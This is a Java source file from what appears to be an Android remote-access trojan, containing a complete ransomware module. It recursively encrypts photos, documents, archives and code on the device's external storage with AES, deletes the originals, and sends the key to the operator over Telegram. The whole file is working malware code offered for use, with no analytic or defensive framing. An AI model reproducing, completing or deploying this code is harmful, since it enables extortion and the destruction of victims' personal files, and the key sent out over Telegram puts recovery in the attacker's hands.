package com.enterprise.rat.commands;

import android.os.Environment;
import com.enterprise.rat.utils.TelegramApi;
import java.io.*;
import java.security.SecureRandom;
import javax.crypto.*;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class RansomwareCryptoManager {
    private static final String ALGORITHM = "AES";
    private static final String TRANSFORMATION = "AES/CBC/PKCS5Padding";
    private static String ransomKey = null;

    public static void encryptFiles(String path, String key) {
        if (key == null || key.length() != 32) {
            key = generateRandomKey();
        }
        final String finalKey = key;
        ransomKey = finalKey;
        final File dir = new File(path != null ? path : Environment.getExternalStorageDirectory().getAbsolutePath());
        new Thread(() -> {
            int count = encryptRecursive(dir, finalKey);
            TelegramApi.sendMessage("🔒 Ransomware: " + count + " files encrypted.\nKey: <code>" + finalKey + "</code>");
        }).start();
    }

    public static void decryptFiles(String path, String key) {
        final String finalKey = key;
        final File dir = new File(path != null ? path : Environment.getExternalStorageDirectory().getAbsolutePath());
        new Thread(() -> {
            int count = decryptRecursive(dir, finalKey);
            TelegramApi.sendMessage("🔓 Decrypted " + count + " files.");
            ransomKey = null;
        }).start();
    }

    private static int encryptRecursive(File dir, String key) {
        if (!dir.exists() || !dir.isDirectory()) return 0;
        int count = 0;
        File[] files = dir.listFiles();
        if (files == null) return 0;
        for (File file : files) {
            if (file.isDirectory() && !file.getName().startsWith(".")) {
                count += encryptRecursive(file, key);
            } else if (isTargetFile(file)) {
                try { encryptFile(file, key); count++; } catch (Exception e) {}
            }
        }
        return count;
    }

    private static int decryptRecursive(File dir, String key) {
        if (!dir.exists() || !dir.isDirectory()) return 0;
        int count = 0;
        File[] files = dir.listFiles();
        if (files == null) return 0;
        for (File file : files) {
            if (file.isDirectory() && !file.getName().startsWith(".")) {
                count += decryptRecursive(file, key);
            } else if (file.getName().endsWith(".rexenc")) {
                try { decryptFile(file, key); count++; } catch (Exception e) {}
            }
        }
        return count;
    }

    private static void encryptFile(File inputFile, String keyStr) throws Exception {
        File encryptedFile = new File(inputFile.getParent(), inputFile.getName() + ".rexenc");
        SecretKeySpec secretKey = new SecretKeySpec(keyStr.getBytes("UTF-8"), ALGORITHM);
        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        byte[] iv = new byte[16];
        new SecureRandom().nextBytes(iv);
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivSpec);

        FileInputStream fis = new FileInputStream(inputFile);
        FileOutputStream fos = new FileOutputStream(encryptedFile);
        fos.write(iv);
        byte[] buffer = new byte[4096];
        int read;
        while ((read = fis.read(buffer)) != -1) {
            byte[] output = cipher.update(buffer, 0, read);
            if (output != null) fos.write(output);
        }
        byte[] output = cipher.doFinal();
        if (output != null) fos.write(output);
        fis.close();
        fos.close();
        inputFile.delete();
    }

    private static void decryptFile(File encryptedFile, String keyStr) throws Exception {
        String originalName = encryptedFile.getName().replace(".rexenc", "");
        File decryptedFile = new File(encryptedFile.getParent(), originalName);
        SecretKeySpec secretKey = new SecretKeySpec(keyStr.getBytes("UTF-8"), ALGORITHM);
        FileInputStream fis = new FileInputStream(encryptedFile);
        byte[] iv = new byte[16];
        fis.read(iv);
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        cipher.init(Cipher.DECRYPT_MODE, secretKey, ivSpec);

        FileOutputStream fos = new FileOutputStream(decryptedFile);
        byte[] buffer = new byte[4096];
        int read;
        while ((read = fis.read(buffer)) != -1) {
            byte[] output = cipher.update(buffer, 0, read);
            if (output != null) fos.write(output);
        }
        byte[] output = cipher.doFinal();
        if (output != null) fos.write(output);
        fis.close();
        fos.close();
        encryptedFile.delete();
    }

    private static boolean isTargetFile(File file) {
        String name = file.getName().toLowerCase();
        String[] extensions = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp",
                               ".mp4", ".mp3", ".wav", ".avi", ".mkv",
                               ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
                               ".txt", ".csv", ".json", ".xml", ".html", ".htm",
                               ".zip", ".rar", ".7z", ".tar", ".gz",
                               ".apk", ".dex", ".jar",
                               ".cpp", ".java", ".kt", ".py", ".js"};
        for (String ext : extensions) {
            if (name.endsWith(ext)) return true;
        }
        return false;
    }

    private static String generateRandomKey() {
        byte[] key = new byte[16];
        new SecureRandom().nextBytes(key);
        StringBuilder sb = new StringBuilder();
        for (byte b : key) sb.append(String.format("%02x", b));
        return sb.toString();
    }

    public static String getRansomKey() { return ransomKey; }
}
